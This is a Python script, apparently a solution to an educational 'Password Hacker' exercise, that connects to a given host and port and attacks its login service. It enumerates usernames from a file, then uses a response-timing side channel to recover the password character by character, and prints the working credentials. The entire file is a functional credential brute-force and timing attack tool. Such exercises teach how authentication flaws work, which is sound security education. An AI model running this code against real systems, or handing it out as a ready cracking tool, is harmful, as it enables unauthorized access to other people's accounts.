# write your code here
import json
import socket
import string
import sys
import time


def command_line_handler():
    # get the command argument
    args = sys.argv
    hostname = args[1]
    port = int(args[2])

    return hostname, port


def authentication_request(login, password=' '):
    """Take the authentication login, password and send json format request."""
    message = {'login': login,
               'password': password}
    return json.dumps(message)


def get_admin_login(server_connection):
    """Try all the login in file and return the correct one
    using password as space."""

    BUFFER = 1024  # bytes
    with open('D:\\python\\Password Hacker\\Password Hacker\\task\\\hacking\\logins.txt', mode='r', encoding='utf-8') as file:
        for line in file:
            legit_login = line.strip()  # remove \n from end
            json_request = authentication_request(legit_login)
            request = json_request.encode('utf-8')  # bytes
            server_connection.send(request)

            json_response = server_connection.recv(BUFFER).decode('utf-8')  # get json format response
            response = json.loads(json_response)

            if response['result'] == 'Wrong password!':
                return legit_login

    return None


def get_admin_password(server_connection, user_login):
    """Return the valid admin password."""

    BUFFER = 1024
    CHARACTERS = ''.join(string.ascii_letters + string.digits)
    legit_password = ''

    while True:
        for character in CHARACTERS:
            json_request = authentication_request(user_login, ''.join(legit_password + character))
            request = json_request.encode('utf-8')
            server_connection.send(request)

            start = time.time()
            json_response = server_connection.recv(BUFFER).decode('utf-8')
            end = time.time()

            response = json.loads(json_response)
            response_time = end - start

            if response['result'] == 'Connection success!':
                legit_password += character
                return legit_password
            elif response_time  > 0.1:
                legit_password += character   # add the character to the previous one


def server_handler(host, port):
    """Establish connection with the given (host, port)
    and transfer data from and to server."""

    address =  (host, port)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as connection:
        connection.connect(address)

        admin_login = get_admin_login(connection)
        admin_password = get_admin_password(connection, admin_login)

        valid_request = authentication_request(admin_login, admin_password)
        print(valid_request)


host, port = command_line_handler()
server_handler(host, port)